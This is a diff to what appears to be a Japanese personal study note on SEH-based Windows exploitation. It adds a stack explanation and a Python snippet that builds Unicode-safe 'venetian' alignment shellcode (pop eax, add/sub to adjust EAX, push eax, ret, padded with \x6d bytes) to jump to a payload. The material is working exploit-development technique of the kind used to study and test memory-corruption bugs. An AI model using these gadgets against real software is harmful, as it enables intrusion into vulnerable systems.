@@ -1882,8 +1882,8 @@ SEHを使用したExploitの場合、`0x0045000e`みたいな感じのアドレ�
 |              | (0x10c)
 
 右下のスタック図
-+100| 00 00 00 00 | .... <- 右側が低いアドレス。ASCII表示するときは反転
-+104| 00 65 00 42 | B.e.
++100| 00 00 00 00 | .... 
++104| 00 65 00 42 | B.e. <- ここに帰ってくるので、ここから命令と解釈して実行する
 +108| 00 45 00 0e | ?.E.
 +10c| 00 00 00 00 | ....
 
@@ -1895,7 +1895,48 @@ SEHを使用したExploitの場合、`0x0045000e`みたいな感じのアドレ�
 
 ```
 #### short jmpコードの作成
+`esp`のアドレスの近くに、シェルコードに近いアドレスがあれば、それをEAXに代入して、ADD/SUBで調整してからpush,retしてジャンプできる。   
+```python
+# nasm > pop eax
+# 00000000  58                pop eax
+# nasm > add byte[ebp],CH                      <- こうすれば、"\x58\x6d"を入力するとこれらの命令を実行できる！
+# 00000000  006D00            add [ebp+0x0],ch 
 
+align = "\x58"  # pop eax     <- eaxに目標の値が代入されるまでpopする
+align += "\x6d" # nop/align
+align += "\x58" # pop eax
+align += "\x6d" # nop/align
+align += "\x58" # pop eax
+align += "\x6d" # nop/align
+align += "\x58" # pop eax
+align += "\x6d" # nop/align
+
+# nasm > add eax,0x11000100
+# 00000000  0500010011        add eax,0x11000100 
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+# nasm > sub eax,0x11002000                       eaxには([元のax]+0x0100-0x2000) がセットされる
+# 00000000  2D00200011        sub eax,0x11002000  つまり、eaxを(0x100-0x2000分)減算できている！
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+
+align += "\x05\x01\x11" # add eax,11000100
+align += "\x6d" # nop
+align += "\x2d\x20\x11" # sub eax,11002000
+align += "\x6d" # nop
+
+# nasm > push eax
+# 00000000  50                push eax         調整したEAXをスタックにpush
+# nasm > add byte[ebp],CH
+# 00000000  006D00            add [ebp+0x0],ch
+# nasm > ret                                   そのEAXにジャンプ！
+# 00000000  C3                ret
+
+jmp = "\x50" # push eax
+jmp += "\x6d" # nop
+jmp += "\xc3" # ret
+
+```
 ## よく見るかたまり
 #### 関数の先頭
 ```txt
